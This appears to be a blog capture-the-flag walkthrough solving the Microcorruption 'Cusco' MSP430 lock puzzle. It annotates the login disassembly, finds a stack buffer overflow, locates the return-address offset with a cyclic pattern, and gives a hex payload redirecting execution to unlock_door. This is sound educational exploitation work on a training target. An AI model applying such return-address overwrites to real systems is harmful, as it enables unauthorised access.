<!doctype html>
<html lang="en">
	<head>
		<!-- Google tag (gtag.js) -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=G-7Z9FV4098Q"></script>
		<script>
		window.dataLayer = window.dataLayer || [];
		function gtag(){dataLayer.push(arguments);}
		gtag('js', new Date());

		gtag('config', 'G-7Z9FV4098Q');
		</script>

		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		
		<link href="../_app/immutable/assets/0.CkCJ_Iij.css" rel="stylesheet">
		<link href="../_app/immutable/assets/5.BGKaKUs6.css" rel="stylesheet">
		<link rel="modulepreload" href="../_app/immutable/entry/start.BU93q3uf.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/CCvRL6Ur.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/ItlUb4HE.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/BmeHx-Ma.js">
		<link rel="modulepreload" href="../_app/immutable/entry/app.Ckg35XVh.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/BO4WaQy6.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/D8SAhovk.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/Lfl0KMkj.js">
		<link rel="modulepreload" href="../_app/immutable/nodes/0.Dmu92B7j.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/a46zp2d9.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/CqVW6OwZ.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/BHTdBxpQ.js">
		<link rel="modulepreload" href="../_app/immutable/nodes/5.BcEMS3aD.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/CzUNRz-P.js"><!--[--><!--]--><title>Microcorruption Cusco</title>
	</head>
	
	<body data-sveltekit-preload-data="hover" style="background-color:  #E9E9DF;">
		<div style="display: contents"><!--[--><!--[--><!----><div class="site-header svelte-1pnrz5s"><h1 id="site-title" class="svelte-1pnrz5s"> Anoth3r Site</h1> <h1 class="blink svelte-1pnrz5s">_</h1></div> <hr class="hr-top svelte-1pnrz5s"> <div class="svelte-1pnrz5s"><ul class="nav-bar svelte-1pnrz5s"><li class="svelte-1pnrz5s"><a href="/" class="svelte-1pnrz5s">Home</a></li> <li class="svelte-1pnrz5s"><a href="/about" class="svelte-1pnrz5s">About</a></li> <li class="svelte-1pnrz5s"><a href="https://github.com/fl1gg" class="svelte-1pnrz5s">Github</a></li> <li class="svelte-1pnrz5s"><a href="/contact" class="svelte-1pnrz5s">Contact</a></li></ul></div> <br class="svelte-1pnrz5s"><!----> <!----><div class="articles svelte-1qj7sin"><div class="header svelte-1qj7sin"><h1 class="title svelte-1qj7sin">Microcorruption Cusco</h1> <p class="subtitle svelte-1qj7sin">The process and solution for the fourth Microcorruption level</p></div> <div class="tags svelte-1qj7sin"><!--[--><span class="tag svelte-1qj7sin">#microcorruption</span><span class="tag svelte-1qj7sin">#reversing</span><span class="tag svelte-1qj7sin">#pwn</span><!--]--></div> <br class="svelte-1qj7sin"> <hr class="svelte-1qj7sin"> <div id="page" class="svelte-1qj7sin"><!----><p>As always here is the manual for Microcorruption:</p> <ul><li>Manual: <a href="https://microcorruption.com/public/manual.pdf" rel="nofollow">https://microcorruption.com/public/manual.pdf</a></li></ul> <p>Additionally, the MSP430 specific booklets:</p> <ul><li>User Guide: <a href="https://www.ti.com/lit/ug/slau049f/slau049f.pdf" rel="nofollow">https://www.ti.com/lit/ug/slau049f/slau049f.pdf</a></li> <li>ABI: <a href="https://www.ti.com/lit/an/slaa534a/slaa534a.pdf" rel="nofollow">https://www.ti.com/lit/an/slaa534a/slaa534a.pdf</a></li></ul> <p>Looking at the program, again the main simply calls the login function, so lets analyze login.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3"> &#x3C;login></span></span>
<span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3150</span><span style="color:#E6EDF3"> f0ff      </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xfff0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span><span style="color:#8B949E">                                      ; allocate space on the stack (16 decimal in this case) because of the overflow</span></span>
<span class="line"><span style="color:#79C0FF">4504</span><span style="color:#E6EDF3">:  3f40 7c44      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x447c</span><span style="color:#E6EDF3"> "</span><span style="color:#FF7B72">Enter</span><span style="color:#E6EDF3"> the password to continue.", </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">   ; </span></span>
<span class="line"><span style="color:#79C0FF">4508</span><span style="color:#E6EDF3">:  b012 a645      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45a6</span><span style="color:#E6EDF3"> &#x3C;puts>                                   </span><span style="color:#8B949E">; print the above string</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">450c:</span><span style="color:#E6EDF3">  3f40 9c44      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x449c</span><span style="color:#E6EDF3"> "</span><span style="color:#D2A8FF">Remember:</span><span style="color:#E6EDF3"> passwords are between </span><span style="color:#79C0FF">8</span><span style="color:#FF7B72"> and</span><span style="color:#79C0FF"> 16</span><span style="color:#E6EDF3"> characters.", </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">     ; </span></span>
<span class="line"><span style="color:#79C0FF">4510</span><span style="color:#E6EDF3">:  b012 a645      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45a6</span><span style="color:#E6EDF3"> &#x3C;puts>                                   </span><span style="color:#8B949E">; print the above string</span></span>
<span class="line"><span style="color:#79C0FF">4514</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 3000</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x30</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">                                       ; set the value of r14 to 0x30</span></span>
<span class="line"><span style="color:#79C0FF">4518</span><span style="color:#E6EDF3">:  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                                          ; move the stack pointer into r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">451a:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">9645</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4596</span><span style="color:#E6EDF3"> &#x3C;getsn>                                  </span><span style="color:#8B949E">; getsn will output user data at address of r15 (or onto the stack)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">451e:</span><span style="color:#E6EDF3">  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                                          ; reset r15 to the location of the stack</span></span>
<span class="line"><span style="color:#79C0FF">4520</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">5244</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4452</span><span style="color:#E6EDF3"> &#x3C;test_password_valid>                    </span></span>
<span class="line"><span style="color:#79C0FF">4524</span><span style="color:#E6EDF3">:  0f93           tst	</span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">                                             </span></span>
<span class="line"><span style="color:#79C0FF">4526</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0524</span><span style="color:#FF7B72">           jz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xc</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x32</span><span style="color:#E6EDF3">>                               </span></span>
<span class="line"><span style="color:#79C0FF">4528</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">4644</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4446</span><span style="color:#E6EDF3"> &#x3C;unlock_door>                           </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">452c:</span><span style="color:#E6EDF3">  3f40 d144      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44d1</span><span style="color:#E6EDF3"> "Access granted.", </span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">                  </span></span>
<span class="line"><span style="color:#79C0FF">4530</span><span style="color:#E6EDF3">:  023c           </span><span style="color:#FF7B72">jmp</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x6</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x36</span><span style="color:#E6EDF3">>                              </span></span>
<span class="line"><span style="color:#79C0FF">4532</span><span style="color:#E6EDF3">:  3f40 e144      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44e1</span><span style="color:#E6EDF3"> "That password is </span><span style="color:#FF7B72">not</span><span style="color:#E6EDF3"> correct.", </span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">    </span></span>
<span class="line"><span style="color:#79C0FF">4536</span><span style="color:#E6EDF3">:  b012 a645      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45a6</span><span style="color:#E6EDF3"> &#x3C;puts>                                  </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">453a:</span><span style="color:#79C0FF">  3150</span><span style="color:#79C0FF"> 1000</span><span style="color:#FF7B72">      add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x10</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span><span style="color:#E6EDF3">                                       </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">453e:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span><span style="color:#E6EDF3">                                                   </span></span></code></pre><!----> <p>At first glance it looks like we make be able to cause a stack overflow. We are able to write an arbitrary amount of data to the stack. Because programs store their return address on the stack, lets try and overflow this return address.</p> <p>First we need the address of the function we want to jump into. Lets use the unlock door function at address 4446.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4446</span><span style="color:#E6EDF3"> &#x3C;unlock_door></span></span>
<span class="line"><span style="color:#79C0FF">4446</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3012</span><span style="color:#E6EDF3"> 7f00      </span><span style="color:#FF7B72">push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x7f</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">444a:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">4245</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4542</span><span style="color:#E6EDF3"> &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">444e:</span><span style="color:#79C0FF">  2153</span><span style="color:#E6EDF3">           incd	</span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#79C0FF">4450</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3041</span><span style="color:#FF7B72">           ret</span></span></code></pre><!----> <p>Next we need to figure out how far into the stack we need to exploit. We can calculate this by hand, but it is easier to generate a pattern. I used the following site: <a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html" rel="nofollow">https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html</a></p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</span></span></code></pre><!----> <p>We can then run the program with a breakpoint at 0x453e.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3"> &#x3C;login></span></span>
<span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3150</span><span style="color:#E6EDF3"> f0ff      </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xfff0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#E6EDF3">...</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">453e:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span><span style="color:#8B949E">                ; add a breakpoint here</span></span></code></pre><!----> <p>From this we see the 0Ab1 is loaded in memory at the stack pointer.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>sp: 43fe</span></span>
<span class="line"><span>43d0: 0000 0000 0000 0000 0000 0000 5645 0100   ............VE..</span></span>
<span class="line"><span>43e0: 5645 0300 ca45 0000 0a00 0000 3a45 aa0a   VE...E......:E..</span></span>
<span class="line"><span>43f0: a1aa 2aa3 aa4a a5aa 6aa7 aa8a a9ab 0ab1   ..*..J..j.......</span></span>
<span class="line"><span>4400: ab2a b3ab 4ab5 ab00 75f3 35d0 085a 3f40   .*..J...u.5..Z?@</span></span></code></pre><!----> <p>Plugging this in we find the return address offset is 32. Using the offset and the address 4446 lets attempt to exploit this. Remembering that data is loaded in little endian:</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>(0x00)*32 + 0x4644 = 000000000000000000000000000000004644</span></span></code></pre><!----> <p>Submitting this, remembering to check the box for hex, solves the puzzle.</p><!----></div></div><!----><!----> <br> <div><hr></div><!----><!----><!--]--> <!--[!--><!--]--><!--]-->
			
			<script>
				{
					__sveltekit_7etl4o = {
						base: new URL("..", location).pathname.slice(0, -1)
					};

					const element = document.currentScript.parentElement;

					Promise.all([
						import("../_app/immutable/entry/start.BU93q3uf.js"),
						import("../_app/immutable/entry/app.Ckg35XVh.js")
					]).then(([kit, app]) => {
						kit.start(app, element, {
							node_ids: [0, 5],
							data: [null,null],
							form: null,
							error: null
						});
					});
				}
			</script>
		</div>
	</body>
	
</html>
